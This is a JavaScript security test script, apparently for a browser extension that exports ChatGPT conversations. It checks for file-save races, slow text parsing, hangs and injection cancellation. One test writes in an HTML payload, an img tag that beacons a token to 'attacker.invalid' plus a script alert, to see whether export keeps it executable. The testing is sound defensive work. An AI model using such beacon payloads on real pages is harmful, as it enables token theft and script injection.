import { resolve } from "node:path";
import { createServer } from "node:http";
import { readFile } from "node:fs/promises";
import { chromium } from "@playwright/test";
import { retrieveCurrentConversation } from "../../../extension/retrieval.js";
import { createExport, validateConversation } from "../../../extension/core.js";
import { fixture, identity } from "../../../tests/fixtures.js";
const root = resolve(import.meta.dirname, "../../..");
const results = {};
const server = createServer(async (req, res) => {
  if (["/extension/save.js", "/extension/core.js"].includes(req.url)) {
    res.writeHead(200, { "Content-Type": "text/javascript" });
    res.end(await readFile(root + req.url));
  } else {
    res.writeHead(200, { "Content-Type": "text/html" });
    res.end("<title>Synthetic security probe</title>");
  }
});
await new Promise((r) => server.listen(0, "127.0.0.1", r));
const browser = await chromium.launch({ headless: true });
try {
  const page = await browser.newPage();
  await page.goto("http://127.0.0.1:" + server.address().port);
  results.directoryRace = await page.evaluate(async () => {
    const { saveFile } = await import("/extension/save.js");
    const root = await navigator.storage.getDirectory();
    const dir = await root.getDirectoryHandle("synthetic-race", {
      create: true,
    });
    const wrapper = dir;
    const a = saveFile(
      new Blob(["FIRST EXPORT MUST SURVIVE"]),
      "Conversation.md",
      { directoryHandle: wrapper },
    );
    const b = saveFile(new Blob(["SECOND EXPORT"]), "Conversation.md", {
      directoryHandle: wrapper,
    });
    const names = await Promise.all([a, b]);
    const content = await (
      await (await dir.getFileHandle("Conversation.md")).getFile()
    ).text();
    const second = await (
      await (await dir.getFileHandle("Conversation (1).md")).getFile()
    ).text();
    const entries = [];
    for await (const [name] of dir.entries()) entries.push(name);
    await root.removeEntry("synthetic-race", { recursive: true });
    return {
      names,
      entries,
      content,
      second,
      firstExportLost: !content.includes("FIRST"),
    };
  });
  // The source text has many separate backtick runs, well below the declared 20 MB budget.
  const { readConversationPage } = await import(
    root + "/extension/page-reader.js"
  );
  const url = "https://chatgpt.com/uc/11111111-1111-4111-8111-111111111111";
  await page.route("https://chatgpt.com/**", (r) =>
    r.fulfill({
      contentType: "text/html",
      body: '<main><div data-message-role="user" id="user-1"><div data-user-message-copy>Test</div></div><div data-message-role="assistant" id="assistant-1" data-message-complete><div data-assistant-markdown><pre><code></code></pre></div></div></main>',
    }),
  );
  await page.goto(url);
  await page.evaluate(
    () => (document.querySelector("code").textContent = "`a".repeat(130000)),
  );
  const start = Date.now();
  results.backtickRuns = {
    characters: 260000,
    result: await page.evaluate(
      async ({ source, url }) => {
        const read = eval("(" + source + ")");
        const result = await read(url);
        return {
          error: result.error,
          messageCount: result.messages?.length,
          codePreserved: result.messages?.[1].parts[0].text.includes(
            "`a".repeat(130000),
          ),
        };
      },
      { source: readConversationPage.toString(), url },
    ),
    elapsedMs: Date.now() - start,
  };
  // Verify that source extraction converts visibly inert angle-bracket text to executable Markdown HTML.
  await page.evaluate(
    () =>
      (document.querySelector("[data-assistant-markdown]").textContent =
        '<img src="https://attacker.invalid/beacon?known-token=synthetic"><script>alert(1)</script>'),
  );
  const read = await page.evaluate(readConversationPage, url);
  const data = fixture();
  data.nodes[2].parts[0].text = read.messages[1].parts[0].text;
  const output = createExport(validateConversation(data, identity(data)), "md");
  results.markdownActivation = {
    inertPageHasImages: await page.locator("img").count(),
    rawHtmlPreserved: output.content.includes(
      '<img src="https://attacker.invalid/beacon?known-token=synthetic">',
    ),
    rawScriptPreserved: output.content.includes("<script>alert(1)</script>"),
  };
  const { readResearchFrame } = await import(root + "/extension/research.js");
  const reportUrl =
    "https://mcp-app-abcd.web-sandbox.oaiusercontent.com/?app=research";
  await page.route(reportUrl, (r) =>
    r.fulfill({
      contentType: "text/html",
      body: '<main><div class="_reportPage_synthetic"><h1>Report</h1></div></main>',
    }),
  );
  await page.goto(reportUrl);
  await page.evaluate(() => {
    document.querySelector("h1").__reactFiber$test = {
      memoizedProps: {
        report: "Synthetic report",
        contentReferences: [],
        runCompletedAtMs: 1,
        reportMessageId: "report-1",
      },
    };
    window.setTimeout = () => 0;
  });
  const research = page.evaluate(readResearchFrame, [reportUrl]).then(
    () => "settled",
    () => "error",
  );
  results.mainWorldHang = await Promise.race([
    research,
    new Promise((r) => setTimeout(() => r("still-pending-after-250ms"), 250)),
  ]);
  await page.close();
} catch (e) {
  results.probeError = String(e);
} finally {
  await browser.close();
  server.close();
}
// Simulate the Chrome API waiting for a never-settling MAIN-world function.
let finishInjection;
globalThis.chrome = {
  scripting: { executeScript: () => new Promise((r) => (finishInjection = r)) },
};
const controller = new AbortController();
const reading = retrieveCurrentConversation(
  { id: 1, url: "https://chatgpt.com/c/11111111-1111-4111-8111-111111111111" },
  { signal: controller.signal },
).then(
  () => "resolved",
  (e) => "rejected:" + e.code,
);
controller.abort();
results.cancelPendingInjection = await Promise.race([
  reading,
  new Promise((r) => setTimeout(() => r("still-pending-after-250ms"), 250)),
]);
finishInjection([]);
await reading;
globalThis.chrome = {
  scripting: { executeScript: () => new Promise(() => {}) },
};
results.injectionDeadline = await retrieveCurrentConversation(
  { id: 1, url: "https://chatgpt.com/c/11111111-1111-4111-8111-111111111111" },
  { timeout: 20 },
).then(
  () => "resolved",
  (e) => e.code,
);
console.log(JSON.stringify(results, null, 2));
